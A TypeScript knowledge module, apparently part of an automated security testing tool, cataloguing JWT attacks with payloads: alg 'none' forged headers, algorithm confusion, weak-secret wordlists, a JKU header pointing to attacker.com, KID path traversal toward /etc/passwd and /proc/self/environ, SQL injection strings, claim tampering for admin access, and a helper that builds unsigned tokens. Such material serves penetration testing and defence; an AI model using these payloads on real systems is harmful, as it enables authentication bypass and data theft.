/**
 * JWT (JSON Web Token) Knowledge
 */
import type { TechKnowledge } from '../types';

export const JWT_KNOWLEDGE: TechKnowledge = {
  id: 'jwt',
  name: 'JSON Web Token (JWT)',
  category: 'auth',

  fingerprints: {
    headers: {
      'authorization': /Bearer\s+eyJ/i,
    },
    cookies: ['token', 'jwt', 'access_token', 'auth_token', 'id_token'],
    bodyPatterns: [
      /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/,  // JWT pattern
      /"token":\s*"eyJ/,
      /"access_token":\s*"eyJ/,
    ],
    urlPatterns: [],
    errorPatterns: [
      /jwt.*expired/i,
      /invalid.*token/i,
      /JsonWebTokenError/,
      /TokenExpiredError/,
      /invalid signature/i,
    ],
  },

  auth: {
    type: 'jwt',
    headerName: 'Authorization',
    tokenFormat: 'Bearer <token>',
    commonMisconfigs: [
      'Algorithm confusion (RS256 -> HS256)',
      'None algorithm accepted',
      'Weak signing secret',
      'No expiration check',
      'JKU/X5U header injection',
      'KID header injection',
    ],
  },

  commonEndpoints: [
    '/api/auth/token',
    '/api/auth/refresh',
    '/api/login',
    '/oauth/token',
    '/token',
    '/.well-known/jwks.json',
    '/api/auth/jwks',
  ],

  vulns: {
    auth_bypass: {
      techniques: [
        {
          name: 'Algorithm None Attack',
          description: 'Set algorithm to "none" to bypass signature verification',
          how: 'Decode JWT, change alg to "none", remove signature',
          context: 'When server accepts tokens with alg: none',
          examples: [
            'Header: {"alg":"none","typ":"JWT"}',
            'Header: {"alg":"None","typ":"JWT"}',
            'Header: {"alg":"NONE","typ":"JWT"}',
            'Header: {"alg":"nOnE","typ":"JWT"}',
          ],
          payloads: [
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.',  // {"alg":"none","typ":"JWT"}
            'eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.',  // {"alg":"None","typ":"JWT"}
            'eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.',  // {"alg":"NONE","typ":"JWT"}
          ],
          indicators: {
            vulnerable: [
              'Request accepted with none algorithm',
              'Valid response with modified claims',
              'No signature verification error',
            ],
            notVulnerable: [
              'Algorithm not supported',
              'Invalid signature',
              'Token rejected',
            ],
          },
        },
        {
          name: 'Algorithm Confusion (RS256 to HS256)',
          description: 'Change algorithm from RS256 to HS256 and sign with public key',
          how: 'If server uses RS256, change to HS256 and sign with public key as HMAC secret',
          context: 'When server public key is known and library is vulnerable',
          examples: [
            'Original: RS256 signature with private key',
            'Attack: HS256 signature using public key as secret',
          ],
          payloads: [],
          indicators: {
            vulnerable: [
              'Token accepted when signed with public key',
              'No algorithm enforcement',
            ],
            notVulnerable: [
              'Algorithm mismatch error',
              'Invalid signature',
            ],
          },
        },
        {
          name: 'Weak Secret Bruteforce',
          description: 'Crack weak HMAC secrets using common wordlists',
          how: 'Extract signature, bruteforce with common secrets',
          context: 'When HS256 used with weak/common secrets',
          examples: [
            'Common secrets: secret, password, 123456, your-256-bit-secret',
          ],
          payloads: [
            'secret',
            'password',
            'your-256-bit-secret',
            'your-secret-key',
            'jwt-secret',
            'supersecret',
          ],
          indicators: {
            vulnerable: [
              'Forged token accepted',
              'Secret found in wordlist',
            ],
            notVulnerable: [
              'Invalid signature (secret not found)',
            ],
          },
        },
        {
          name: 'JKU Header Injection',
          description: 'Point jku header to attacker-controlled JWKS',
          how: 'Add jku header pointing to your server with crafted keys',
          context: 'When server fetches keys from jku header without validation',
          examples: [
            'Header: {"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}',
          ],
          payloads: [],
          indicators: {
            vulnerable: [
              'Server fetches from attacker URL',
              'Token signed with attacker key accepted',
            ],
            notVulnerable: [
              'jku not allowed',
              'URL validation failed',
            ],
          },
        },
        {
          name: 'KID Header Injection',
          description: 'Inject path traversal or SQL in kid header',
          how: 'kid header may be used in file path or database query',
          context: 'When kid is used unsafely to fetch keys',
          examples: [
            'kid: "../../../dev/null"',
            'kid: "key\' OR \'1\'=\'1"',
            'kid: "/dev/null"',
          ],
          payloads: [
            '../../../dev/null',
            '../../../../../../dev/null',
            '/dev/null',
            "' OR '1'='1",
            'key1 UNION SELECT password FROM users--',
          ],
          indicators: {
            vulnerable: [
              'Token accepted with path traversal',
              'SQL error from kid value',
              'Key loaded from unexpected location',
            ],
            notVulnerable: [
              'kid validation failed',
              'Key not found',
            ],
          },
        },
        {
          name: 'Claim Manipulation',
          description: 'Modify payload claims for privilege escalation',
          how: 'Decode JWT, modify role/admin/user_id claims, re-sign if possible',
          context: 'When combined with other attacks that allow signing',
          examples: [
            'Change {"role":"user"} to {"role":"admin"}',
            'Change {"user_id":123} to {"user_id":1}',
          ],
          payloads: [],
          indicators: {
            vulnerable: [
              'Elevated access with modified claims',
              'Admin functionality accessible',
            ],
            notVulnerable: [
              'Invalid signature',
              'Claim validation failed',
            ],
          },
        },
      ],
      payloads: [],
      indicators: {
        vulnerable: [
          'Token with modified algorithm accepted',
          'None algorithm works',
          'Weak secret cracked',
          'JKU/KID injection successful',
        ],
        notVulnerable: [
          'Strict algorithm verification',
          'Strong random secret',
          'Header parameter validation',
        ],
      },
      adaptiveStrategy: 'First try none algorithm (all case variations). If that fails, try algorithm confusion if public key known. Check for JKU/KID injection. Finally, try weak secret bruteforce.',
    },

    injection: {
      techniques: [
        {
          name: 'KID SQL Injection',
          description: 'SQL injection via kid header',
          how: 'kid value may be used in SQL query to fetch signing key',
          context: 'When keys are stored in database and kid is not sanitized',
          examples: [
            'kid: "key1\' UNION SELECT \'secret\' --"',
          ],
          payloads: [
            "' OR '1'='1",
            "' UNION SELECT 'secret'--",
            "1; SELECT * FROM keys--",
          ],
        },
        {
          name: 'KID Path Traversal',
          description: 'Path traversal via kid header',
          how: 'kid value may be used to read key files from disk',
          context: 'When keys are stored in filesystem',
          examples: [
            'kid: "../../../etc/passwd"',
            'kid: "/dev/null"',
          ],
          payloads: [
            '../../../etc/passwd',
            '../../../../../../dev/null',
            '/proc/self/environ',
          ],
        },
      ],
      payloads: [],
      indicators: {
        vulnerable: [
          'SQL error in response',
          'File content in error',
          'Token accepted with injected key',
        ],
        notVulnerable: [
          'kid sanitized',
          'Key ID not found',
          'Path validation failed',
        ],
      },
      adaptiveStrategy: 'Test kid header with both SQL and path traversal payloads.',
    },
  },

  notes: [
    'Always decode and inspect JWT claims first (jwt.io, jwt_tool)',
    'Check /.well-known/jwks.json for public keys',
    'Look for refresh token endpoints - often less protected',
    'Expired tokens may still work if expiration not checked',
    'Some libraries accept tokens with trailing data',
    'Check if same token works across environments (dev key in prod)',
    'jwt_tool and jwt-cracker are useful for automated testing',
  ],

  relatedTech: ['oauth', 'express', 'nodejs', 'spring'],
};

/**
 * JWT testing utilities
 */
export const JWT_UTILS = {
  // Decode JWT without verification
  decode: (token: string): { header: any; payload: any; signature: string } | null => {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) return null;

      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      const signature = parts[2];

      return { header, payload, signature };
    } catch {
      return null;
    }
  },

  // Create unsigned JWT (alg: none)
  createUnsigned: (payload: object): string => {
    const header = { alg: 'none', typ: 'JWT' };
    const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
    const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
    return `${headerB64}.${payloadB64}.`;
  },

  // Common weak secrets to try
  commonSecrets: [
    'secret',
    'password',
    'your-256-bit-secret',
    'your-secret-key',
    'jwt-secret',
    'jwt_secret',
    'supersecret',
    'changeme',
    'qwerty',
    '123456',
    'key',
    'private',
    'public',
  ],
};
